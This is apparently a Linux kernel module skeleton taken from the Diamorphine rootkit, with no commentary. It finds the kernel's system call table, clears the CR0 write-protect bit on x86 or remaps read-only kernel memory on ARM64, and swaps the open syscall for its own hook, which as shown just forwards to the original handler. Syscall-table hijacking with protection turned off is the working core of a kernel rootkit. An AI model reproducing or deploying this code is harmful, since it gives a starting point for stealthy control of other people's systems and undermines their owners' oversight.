#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 


#include "rscaller.h"

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif

static unsigned long *__sys_call_table;
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_read;

unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}



#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void
write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
}
#endif

static inline void
protect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0);
#else
	write_cr0(cr0);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL_RO);

#endif
}

static inline void
unprotect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
			section_size, PAGE_KERNEL);
#endif
}



asmlinkage int
hooked_open(const struct pt_regs *pt_regs)
{
	return orig_read(pt_regs);
}

int syscall_num = __NR_open;

static int __init
diamorphine_init(void)
{
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	cr0 = read_cr0();
#elif IS_ENABLED(CONFIG_ARM64)
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");
#endif


	orig_read = (t_syscall)__sys_call_table[syscall_num];

	unprotect_memory();

	__sys_call_table[syscall_num] = (unsigned long) hooked_open;

	protect_memory();

	return 0;
}

static void __exit
diamorphine_cleanup(void)
{
	unprotect_memory();

	__sys_call_table[syscall_num] = (unsigned long) orig_read;

	protect_memory();
}

module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("your mom");
MODULE_DESCRIPTION("Rscaller kmod");
